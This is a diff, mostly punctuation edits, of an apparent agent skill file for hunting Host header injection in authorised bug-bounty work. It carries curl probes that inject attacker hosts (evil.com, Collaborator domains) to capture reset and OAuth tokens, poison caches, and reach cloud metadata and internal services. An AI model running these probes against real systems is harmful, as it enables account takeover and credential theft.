@@ -29,26 +29,26 @@ report_count: 16
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-# HUNT-HOST-HEADER: Host Header Injection
+# HUNT-HOST-HEADER — Host Header Injection
 
 ## Grounding / Provenance
 
 This skill is built from the public Host-header attack literature, not invented payloads.
 Cite the *technique source* in your report, never a fabricated ID:
 
-- **Password-reset poisoning class**; the canonical write-up is Skelet's/Detectify-era
+- **Password-reset poisoning class** — the canonical write-up is Skelet's/Detectify-era
   "Practical HTTP Host header attacks" (the Django `request.get_host()` → password-reset-link
   case). Many frameworks built the reset URL from the request Host with no `ALLOWED_HOSTS`-style
   allowlist. Cite the framework + the reflected-Host behaviour you actually observed.
-- **Web cache poisoning via unkeyed Host / X-Forwarded-Host**; PortSwigger Research,
+- **Web cache poisoning via unkeyed Host / X-Forwarded-Host** — PortSwigger Research,
   James Kettle, "Practical Web Cache Poisoning" (2018) and "Web Cache Entanglement" (2020).
   These define unkeyed-input poisoning, which is the mechanism behind X-Forwarded-Host poisoning.
-- **Routing-based SSRF**; PortSwigger Research, "Cracking the lens" / routing-based SSRF
+- **Routing-based SSRF** — PortSwigger Research, "Cracking the lens" / routing-based SSRF
   (Host header steers the front-end's upstream selection).
 
 When you write the report, name the exact behaviour you reproduced (reflected header, cache HIT
 on a fresh key, OOB hit from your Collaborator). Do **not** copy a CVE or H1 ID you have not
-verified; a missing citation is always better than a wrong one.
+verified — a missing citation is always better than a wrong one.
 
 ---
 
@@ -57,20 +57,20 @@ verified; a missing citation is always better than a wrong one.
 Reset-link manipulation has context-dependent severity; an owned-account test alone does not establish takeover of any user. State required victim interaction, token validation and demonstrated scope.
 
 **Highest-value chains:**
-- **Password reset poisoning → ATO**; server builds the reset link from the request Host;
+- **Password reset poisoning → ATO** — server builds the reset link from the request Host;
   attacker sets `Host: evil.com`; the victim's reset email points the token at the attacker →
   token captured on click → full ATO. Pre-account-takeover variant: even the victim *requesting*
   their own reset leaks the token to evil.com.
-- **Web cache poisoning via unkeyed Host**; a CDN/reverse proxy caches a response that reflects
+- **Web cache poisoning via unkeyed Host** — a CDN/reverse proxy caches a response that reflects
   an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) → poisoned
   entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
-- **Routing-based SSRF**; the front-end uses the *Host header itself* to pick the upstream;
+- **Routing-based SSRF** — the front-end uses the *Host header itself* to pick the upstream;
   `Host: 169.254.169.254` (or an internal hostname) makes it forward your request to that target
   → cloud metadata / internal admin panels.
-- **Path-override SSRF / ACL bypass**; IIS/ASP.NET/Spring honour `X-Original-URL` /
+- **Path-override SSRF / ACL bypass** — IIS/ASP.NET/Spring honour `X-Original-URL` /
   `X-Rewrite-URL` to override the routed path → reach `/admin` or internal endpoints the edge
-  ACL thought it blocked. (Different layer from routing SSRF; see Phase 3.)
-- **OAuth/OIDC poisoning**; Host drives `redirect_uri` or the OIDC `issuer` / discovery doc →
+  ACL thought it blocked. (Different layer from routing SSRF — see Phase 3.)
+- **OAuth/OIDC poisoning** — Host drives `redirect_uri` or the OIDC `issuer` / discovery doc →
   auth-code or token theft → ATO.
 
 ---
@@ -101,7 +101,7 @@ Use an owner-approved isolated cache namespace/lab and disposable owned accounts
 
 > Always test against **your own** registered test account. Never request another user's reset.
 
-### Phase 1: Password Reset Poisoning
+### Phase 1 — Password Reset Poisoning
 
 ```bash
 # 1a. Override Host directly
@@ -139,13 +139,13 @@ curl -s -X POST https://$TARGET/forgot-password \
 appear under an attacker-controlled host (`evil.com`, `$TARGET.evil.com`, or a Collaborator
 domain) for this to be a real finding. **Use a Burp Collaborator domain as the injected host** so
 that when the victim clicks (or a preview-fetcher fetches), you capture the token out-of-band and
-have proof; see Validation.
+have proof — see Validation.
 
-### Phase 2: Web Cache Poisoning via Host / X-Forwarded-Host
+### Phase 2 — Web Cache Poisoning via Host / X-Forwarded-Host
 
 Mechanism: this is a **reflection** bug, not an OOB bug. The injected host must be *reflected into
 the response body* (an absolute URL, script `src`, `<link href>`, `<base href>`, redirect
-`Location`, or canonical/og:url) **and** that response must be **cached and reusable by another permitted request on the same verified test key**. No Collaborator callback is expected from the cache test itself; only later, if a
+`Location`, or canonical/og:url) **and** that response must be **cached and reusable by another permitted request on the same verified test key**. No Collaborator callback is expected from the cache test itself — only later, if a
 victim's browser loads the poisoned absolute URL.
 
 ```bash
@@ -168,20 +168,20 @@ curl -s "$URL" | grep -i "evilcdn.example"                        # clean victim
 
 **False-positive killers (mandatory):**
 - A reflection that only ever appears for *your* request (because the header is **keyed**, e.g. in
-  `Vary`, or the CDN includes Host in the key) is **not** poisoning; confirm 2c returns the
+  `Vary`, or the CDN includes Host in the key) is **not** poisoning — confirm 2c returns the
   payload on a request that *omits* the header.
 - `Age: 0` + `MISS` every time → no shared cache → no mass impact. Demote to self-only / Low.
 - Confirm blast radius from a **second machine / fresh egress IP / incognito** before claiming
   "mass". Cache scope is often per-edge / per-cookie / per-geo.
 
-### Phase 3: SSRF via Host Header: TWO DISTINCT MECHANISMS (do not conflate)
+### Phase 3 — SSRF via Host Header — TWO DISTINCT MECHANISMS (do not conflate)
 
 These operate at different layers. Test them separately; they do **not** compose into one request.
 
-**(3A) Routing-based SSRF; the Host header selects the upstream.** The path goes on the
+**(3A) Routing-based SSRF — the Host header selects the upstream.** The path goes on the
 **request line**, exactly as a normal request, because the metadata service / internal host serves
 plain HTTP and only sees the request line + headers you forward. `X-Original-URL` is irrelevant
-here; the EC2 IMDS ignores it.
+here — the EC2 IMDS ignores it.
 
 ```bash
 # Correct routing-SSRF probe: path on the request line, Host steers the proxy upstream.
@@ -199,11 +199,11 @@ curl -s "https://$TARGET/" -H "Host: localhost:6379"   # Redis behind the proxy
 curl -s "https://$TARGET/" -H "Host: internal-admin.svc.cluster.local"
 
 # Blind / no reflection? Point the Host at a Collaborator subdomain and watch for the
-# proxy's outbound DNS/HTTP lookup: that proves the front-end resolves the attacker host.
+# proxy's outbound DNS/HTTP lookup — that proves the front-end resolves the attacker host.
 curl -s "https://$TARGET/" -H "Host: $COLLAB"
 ```
 
-**(3B) Path-override SSRF / ACL bypass; `X-Original-URL` / `X-Rewrite-URL`.** This is an
+**(3B) Path-override SSRF / ACL bypass — `X-Original-URL` / `X-Rewrite-URL`.** This is an
 IIS/ASP.NET/Spring-Cloud-Gateway feature where the app overrides the *routed path*. The real Host
 stays put; you are bypassing an **edge path ACL**, not steering an upstream. Keep the real Host.
 
@@ -218,7 +218,7 @@ curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metri
 > The old probe `Host: 169.254.169.254` + `X-Original-URL: /latest/meta-data/` was wrong: those
 > two headers act at different layers and never compose. Use 3A for metadata, 3B for ACL bypass.
 
-### Phase 4: OAuth / OIDC / SAML Poisoning
+### Phase 4 — OAuth / OIDC / SAML Poisoning
 
 ```bash
 # Does the authorization endpoint build redirect_uri / display URL from Host?
@@ -231,9 +231,9 @@ curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host:
 ```
 
 **Confirm:** the auth code / token must actually be delivered to the attacker host (capture on
-Collaborator); a reflected string alone is not ATO.
+Collaborator) — a reflected string alone is not ATO.
 
-### Phase 5: Header Fuzzing (Param Miner)
+### Phase 5 — Header Fuzzing (Param Miner)
 
 Burp **Param Miner → Guess headers** is faster and finds unkeyed/cache-affecting headers the list
 below misses. Manual sweep:
@@ -254,11 +254,11 @@ done
 
 | Finding | Chain to | Impact |
 |---------|----------|--------|
-| Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical; ATO any user |
-| X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High; mass cache poisoning |
-| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical; SSRF → cloud creds |
-| `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High; ACL bypass / SSRF |
-| OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical; ATO via code theft |
+| Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical — ATO any user |
+| X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
+| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
+| `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High — ACL bypass / SSRF |
+| OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical — ATO via code theft |
 
 ---
 
@@ -280,7 +280,7 @@ not merely reflected.
 - Reflected ≠ cached. Cached-for-you ≠ cached-for-others (check `Vary`, second IP).
 - A 200 echoing your Host string is not SSRF unless the *response content* came from the internal
   target or your Collaborator fired.
-- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host; reflected header in the
+- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host — reflected header in the
   HTTP response does not guarantee a poisoned *email*; verify the email body.
 
 **Severity:**
@@ -293,7 +293,7 @@ not merely reflected.
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
 
 ## Limitations
 
